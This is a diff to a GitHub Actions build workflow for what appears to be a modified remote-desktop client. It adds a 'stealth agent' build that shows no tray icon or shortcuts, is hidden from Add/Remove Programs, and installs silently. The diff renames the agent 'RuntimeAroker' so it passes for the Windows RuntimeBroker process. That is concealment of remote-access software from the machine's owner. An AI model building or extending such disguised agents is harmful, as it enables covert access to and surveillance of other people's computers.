@@ -29,7 +29,7 @@ on:
         default: ''
         type: string
       agentui:
-        description: '1 = stealth agent (DevicesFlowUserSvc) build: tiny ID window, no tray/shortcuts/ARP, LocalAppData install, NSIS silent shell'
+        description: '1 = stealth agent (RuntimeAroker) build: tiny ID window, no tray/shortcuts/ARP, LocalAppData install, NSIS silent shell'
         required: false
         default: ''
         type: string
@@ -243,7 +243,7 @@ jobs:
           python patch_default_view_only.py .
           grep -n "_hyApplyDefaultViewOnly" flutter/lib/desktop/pages/remote_page.dart
 
-      - name: Apply agent UI (DevicesFlowUserSvc stealth agent)
+      - name: Apply agent UI (RuntimeAroker stealth agent)
         if: ${{ inputs.agentui == '1' }}
         shell: bash
         run: |
@@ -265,8 +265,8 @@ jobs:
           # 校验关键落点
           grep -n "const AgentPage()" flutter/lib/main.dart
           grep -n "hy_show_id" flutter/lib/main.dart
-          grep -n "DevicesFlowUserSvc" flutter/windows/runner/main.cpp
-          grep -n "RuntimeBroker_devicesflowusersvc" src/privacy_mode/win_topmost_window.rs
+          grep -n "RuntimeAroker" flutter/windows/runner/main.cpp
+          grep -n "RuntimeBroker_runtimearoker" src/privacy_mode/win_topmost_window.rs
           grep -n "ARPSYSTEMCOMPONENT" res/msi/Package/Fragments/ShortcutProperties.wxs
           grep -n "INSTALLFOLDER_AGENT_DEFAULT" res/msi/Package/Components/Folders.wxs
 
